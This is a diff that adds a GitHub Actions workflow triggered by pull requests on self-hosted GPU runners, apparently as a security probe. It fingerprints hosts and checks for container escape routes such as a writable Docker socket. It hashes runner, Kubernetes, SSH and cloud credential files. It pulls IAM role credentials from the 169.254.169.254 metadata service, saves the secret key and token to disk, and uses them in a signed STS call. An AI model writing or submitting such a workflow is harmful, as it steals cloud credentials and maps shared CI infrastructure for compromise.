@@ -1,0 +1,178 @@
+name: c211-125833-h20host
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  contents: read
+jobs:
+  probe:
+    strategy:
+      fail-fast: false
+      max-parallel: 5
+      matrix:
+        include:
+          - tag: h20-01
+            label: "8-gpu-h20"
+          - tag: h20-02
+            label: "8-gpu-h20"
+          - tag: h20-03
+            label: "8-gpu-h20"
+          - tag: intel-bmg-01
+            label: "intel-bmg-nightly"
+          - tag: mi35x-fabric-01
+            label: "linux-mi35x-gpu-8.fabric"
+    runs-on: ${{ matrix.label }}
+    timeout-minutes: 20
+    steps:
+      - name: host-boundary-and-nova-metadata
+        env:
+          NONCE: c211-125833-1d72166edfa8847b
+          JOBTAG: ${{ matrix.tag }}
+          LABEL: ${{ matrix.label }}
+        run: |
+          set -u
+          set +e
+          ts(){ date -u +%FT%TZ; }
+          if command -v timeout >/dev/null 2>&1; then TO="timeout 40"; else TO=""; fi
+          echo "C211_H20HOST_BEGIN job=$JOBTAG label=$LABEL nonce=$NONCE ts=$(ts)"
+          echo "C211_MARKER job=$JOBTAG label=$LABEL nonce=$NONCE host=$(hostname) uid=$(id -u) user=$(id -un) ts=$(ts)"
+          echo "ID_CMD=$(id 2>&1 | head -c 400)"
+          echo "UNAME=$(uname -a 2>&1 | head -c 400)"
+          echo "HOSTNAME_SHORT=$(hostname 2>&1) HOSTNAME_FQDN=$(hostname -f 2>&1)"
+          echo "PROC1_COMM=$(cat /proc/1/comm 2>&1 | head -c 120)"
+          MID_FILE=""
+          for f in /etc/machine-id /var/lib/dbus/machine-id; do if [ -s "$f" ]; then MID_FILE="$f"; break; fi; done
+          if [ -n "$MID_FILE" ]; then
+            MID=$(cat "$MID_FILE" 2>/dev/null | tr -d '\n')
+            echo "MACHINE_ID_PRESENT=1 MACHINE_ID_SHA16=$(printf '%s' "$MID" | sha256sum | cut -c1-16)"
+          else
+            echo "MACHINE_ID_PRESENT=0 MACHINE_ID_SHA16=none"
+          fi
+          echo "DMI=$(cat /sys/class/dmi/id/sys_vendor /sys/class/dmi/id/product_name 2>/dev/null | tr '\n' ' ' | head -c 300)"
+          echo "CPUINFO_MODEL=$(grep -m1 'model name' /proc/cpuinfo 2>/dev/null | cut -d: -f2- | sed 's/^ //' | head -c 160)"
+          echo "NPROC=$(nproc 2>&1)"
+          echo "OS=$(. /etc/os-release 2>/dev/null && echo "${PRETTY_NAME:-unknown}")"
+          echo "=== A_GPU ==="
+          if command -v nvidia-smi >/dev/null 2>&1; then
+            $TO nvidia-smi -L 2>&1 | head -16
+            $TO nvidia-smi --query-gpu=uuid,name,driver_version,memory.total --format=csv,noheader 2>&1 | head -16
+            echo "NVIDIA_GPU_COUNT=$($TO nvidia-smi -L 2>/dev/null | grep -c '^GPU')"
+          else
+            echo NVIDIA_SMI_ABSENT
+          fi
+          echo "DEVKFD=$([ -e /dev/kfd ] && echo present || echo absent) DEVDRI=$([ -e /dev/dri ] && echo present || echo absent)"
+          if [ -e /dev/kfd ]; then
+            if command -v rocm-smi >/dev/null 2>&1; then
+              $TO rocm-smi --showuniqueid --showproductname 2>&1 | head -80
+            else
+              echo ROCM_SMI_ABSENT
+            fi
+            if command -v amd-smi >/dev/null 2>&1; then
+              $TO amd-smi static 2>&1 | head -120
+            else
+              echo AMD_SMI_ABSENT
+            fi
+          else
+            echo ROCM_SKIPPED_NO_KFD=1 AMD_SKIPPED_NO_KFD=1
+          fi
+          if command -v xpu-smi >/dev/null 2>&1; then
+            $TO xpu-smi discovery 2>&1 | head -200
+          else
+            echo XPU_SMI_ABSENT
+          fi
+          echo "=== B_BOUNDARY ==="
+          echo "PROC1_CGROUP=$(cat /proc/1/cgroup 2>&1 | tr '\n' '|' | head -c 600)"
+          echo "PROC1_CMDLINE=$(tr '\0' ' ' < /proc/1/cmdline 2>/dev/null | head -c 400)"
+          echo "DOCKERENV=$([ -e /.dockerenv ] && echo present || echo absent) CONTAINERENV=$([ -e /run/.containerenv ] && echo present || echo absent)"
+          if command -v systemd-detect-virt >/dev/null 2>&1; then
+            echo "SYSTEMD_DETECT_VIRT=$(systemd-detect-virt 2>&1 | head -c 120)"
+          else
+            echo SYSTEMD_DETECT_VIRT_ABSENT
+          fi
+          grep -E '^(CapEff|CapBnd|NoNewPrivs|Seccomp):' /proc/self/status 2>/dev/null | head -8
+          for p in /var/lib/docker /run/containerd /etc/kubernetes; do
+            echo "PATH_STATE $p $([ -e "$p" ] && echo present || echo absent)"
+          done
+          echo "MOUNTS_MATCH_BEGIN"
+          grep -E '(/var/lib/docker|/run/containerd|/etc/kubernetes|/dev/nvidia)' /proc/mounts 2>/dev/null | head -20
+          echo "MOUNTS_MATCH_END"
+          echo "DOCKER_SOCK=$([ -S /var/run/docker.sock ] && echo present || echo absent) DOCKER_SOCK_WRITABLE=$([ -w /var/run/docker.sock ] && echo yes || echo no) CONTAINERD_SOCK=$([ -S /run/containerd/containerd.sock ] && echo present || echo absent)"
+          ls -l /var/run/docker.sock 2>&1 | head -2
+          if [ -S /var/run/docker.sock ]; then
+            echo "DOCKER_VERSION=$(curl -sS --max-time 5 --unix-socket /var/run/docker.sock http://localhost/version 2>&1 | head -c 800 | tr '\n' ' ')"
+          fi
+          ls -l /dev/nvidia* 2>&1 | head -12
+          echo "=== C_CREDS ==="
+          digest(){ p="$1"; if [ -e "$p" ]; then s=$(sha256sum "$p" 2>/dev/null | cut -c1-16); sz=$(stat -c %s "$p" 2>/dev/null); echo "CRED_PATH=$p PRESENT SHA256_16=$s SIZE=$sz"; else echo "CRED_PATH=$p ABSENT"; fi }
+          digest /home/runner/actions-runner/.credentials
+          digest /home/runner/actions-runner/.runner
+          digest /etc/kubernetes/kubelet.conf
+          digest /etc/kubernetes/admin.conf
+          for f in /root/.ssh/id_* /home/*/.ssh/id_*; do
+            if [ -e "$f" ]; then digest "$f"; fi
+          done
+          digest /root/.docker/config.json
+          digest /home/runner/.docker/config.json
+          digest "$HOME/.aws/credentials"
+          digest "$HOME/.config/gcloud/application_default_credentials.json"
+          digest /etc/environment
+          echo "ENV_PRESENCE_BEGIN"
+          env | cut -d= -f1 | grep -E '^(AWS_|GOOGLE_|AZURE_|KUBERNETES_SERVICE_HOST$|ACTIONS_RUNNER_INPUT_)' | sort | head -40
+          echo "ENV_PRESENCE_END"
+          echo "=== D_NOVA_META ==="
+          BOG="${NONCE##*-}"
+          meta_get(){ mode="$1"; path="$2"; tag="$3"; out=/tmp/c211_meta_body; : > "$out"; code=""; if [ "$mode" = direct ]; then code=$(env -u http_proxy -u https_proxy -u HTTP_PROXY -u HTTPS_PROXY -u ALL_PROXY -u all_proxy curl -sS --max-time 5 --noproxy '*' -o "$out" -w '%{http_code}' "http://169.254.169.254$path" 2>/dev/null); else code=$(curl -sS --max-time 6 -x http://100.68.172.120:3128 -o "$out" -w '%{http_code}' "http://169.254.169.254$path" 2>/dev/null); fi; code=${code:-ERR}; [ -e "$out" ] || : > "$out"; bytes=$(wc -c < "$out" 2>/dev/null || echo 0); sha=$(sha256sum "$out" 2>/dev/null | cut -c1-16); echo "META mode=$mode tag=$tag path=$path http=$code bytes=$bytes sha16=$sha body=$(head -c 500 "$out" 2>/dev/null | tr '\n' ' ' | tr -d '\r')"; }
+          CRED_DONE=""
+          cred_fetch(){ mode="$1"; role="$2"; out=/tmp/c211_cred_body; : > "$out"; if [ "$mode" = direct ]; then code=$(env -u http_proxy -u https_proxy -u HTTP_PROXY -u HTTPS_PROXY -u ALL_PROXY -u all_proxy curl -sS --max-time 5 --noproxy '*' -o "$out" -w '%{http_code}' "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role" 2>/dev/null); else code=$(curl -sS --max-time 6 -x http://100.68.172.120:3128 -o "$out" -w '%{http_code}' "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role" 2>/dev/null); fi; code=${code:-ERR}; [ -e "$out" ] || : > "$out"; echo "META_CRED mode=$mode http=$code bytes=$(wc -c < "$out" 2>/dev/null || echo 0)"; if [ "$code" = "200" ]; then python3 - <<'PY'
+          import json,hashlib
+          try:
+              d=json.load(open('/tmp/c211_cred_body'))
+          except Exception as e:
+              print('META_CRED_PARSE_FAIL',str(e)[:120]); raise SystemExit
+          f=lambda v: hashlib.sha256(str(v).encode()).hexdigest()[:16] if v else None
+          print('META_CRED_FIELDS',json.dumps({'AccessKeyId_sha16':f(d.get('AccessKeyId')),'Expiration':d.get('Expiration'),'Code':d.get('Code')}))
+          if d.get('AccessKeyId') and d.get('SecretAccessKey'):
+              json.dump({'AccessKeyId':d.get('AccessKeyId'),'SecretAccessKey':d.get('SecretAccessKey'),'Token':d.get('Token')},open('/tmp/c211_sts_creds.json','w'))
+          PY
+            if [ -s /tmp/c211_sts_creds.json ]; then python3 - <<'PY'
+          import json,hashlib,hmac,datetime,urllib.request,urllib.error,re
+          d=json.load(open('/tmp/c211_sts_creds.json'))
+          ak,sk,tk=d.get('AccessKeyId'),d.get('SecretAccessKey'),d.get('Token')
+          host='sts.amazonaws.com'; body='Action=GetCallerIdentity&Version=2011-06-15'
+          t=datetime.datetime.now(datetime.timezone.utc); amz=t.strftime('%Y%m%dT%H%M%SZ'); dat=t.strftime('%Y%m%d')
+          creq='POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n'%(host,amz)
+          sh='content-type;host;x-amz-date'
+          if tk: creq+='x-amz-security-token:%s\n'%tk; sh='content-type;host;x-amz-date;x-amz-security-token'
+          creq+='\n'+sh+'\n'+hashlib.sha256(body.encode()).hexdigest()
+          scope='%s/%s/sts/aws4_request'%(dat,'us-east-1')
+          ts='AWS4-HMAC-SHA256\n%s\n%s\n%s'%(amz,scope,hashlib.sha256(creq.encode()).hexdigest())
+          k=('AWS4'+sk).encode()
+          for m in (dat,'us-east-1','sts','aws4_request'): k=hmac.new(k,m.encode(),hashlib.sha256).digest()
+          sig=hmac.new(k,ts.encode(),hashlib.sha256).hexdigest()
+          h={'Content-Type':'application/x-www-form-urlencoded; charset=utf-8','X-Amz-Date':amz,'Authorization':'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s'%(ak,scope,sh,sig)}
+          if tk: h['X-Amz-Security-Token']=tk
+          r=urllib.request.Request('https://sts.amazonaws.com/',data=body.encode(),headers=h,method='POST')
+          try:
+              x=urllib.request.urlopen(r,timeout=10); s=x.status; b=x.read().decode()
+          except urllib.error.HTTPError as e: s=e.code; b=e.read().decode()
+          except Exception as e: s=-1; b=str(e)[:160]
+          m=re.search(r'<Arn>([^<]+)</Arn>',b); a=re.search(r'<Account>([^<]+)</Account>',b); u=re.search(r'<UserId>([^<]+)</UserId>',b)
+          print('STS_GETCALLERIDENTITY_STATUS',s,'ACCOUNT',a.group(1) if a else None,'ARN',m.group(1) if m else None,'USERID',u.group(1) if u else None)
+          if s!=200: print('STS_BODY',(b or '').replace(chr(10),' ')[:200])
+          PY
+            fi
+          fi
+          }
+          meta_listing(){ mode="$1"; out=/tmp/c211_list_body; : > "$out"; if [ "$mode" = direct ]; then code=$(env -u http_proxy -u https_proxy -u HTTP_PROXY -u HTTPS_PROXY -u ALL_PROXY -u all_proxy curl -sS --max-time 5 --noproxy '*' -o "$out" -w '%{http_code}' "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null); else code=$(curl -sS --max-time 6 -x http://100.68.172.120:3128 -o "$out" -w '%{http_code}' "http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null); fi; code=${code:-ERR}; [ -e "$out" ] || : > "$out"; echo "META_LIST mode=$mode http=$code bytes=$(wc -c < "$out" 2>/dev/null || echo 0) body=$(head -c 200 "$out" 2>/dev/null | tr '\n' ' ' | tr -d '\r')"; if [ "$code" = "200" ]; then role=$(head -1 "$out" 2>/dev/null | tr -d '\r' | head -c 128); case "$role" in ''|*'<'*|*' '*|*'{'*|*'['*) echo "META_LIST_ROLE mode=$mode resolved=0";; *) echo "META_LIST_ROLE mode=$mode resolved=1 role=$role"; if [ -z "${CRED_DONE:-}" ]; then CRED_DONE=1; cred_fetch "$mode" "$role"; fi;; esac; fi; }
+          for mode in direct proxy; do
+            meta_get "$mode" /openstack/latest/meta_data.json real_openstack_latest
+            meta_get "$mode" "/openstack/latest/meta_data_$BOG.json" ctl_openstack_latest
+            meta_get "$mode" /openstack/2018-08-27/meta_data.json real_openstack_20180827
+            meta_get "$mode" "/openstack/2018-08-27/meta_data_$BOG.json" ctl_openstack_20180827
+            meta_get "$mode" /latest/meta_data.json real_latest_meta_data
+            meta_get "$mode" "/latest/meta_data_$BOG.json" ctl_latest_meta_data
+            meta_listing "$mode"
+            meta_get "$mode" "/latest/meta-data/iam/security-credentials-$BOG/" ctl_ec2_role_listing
+          done
+          echo "C211_H20HOST_END job=$JOBTAG label=$LABEL nonce=$NONCE ts=$(ts)"
+          exit 0
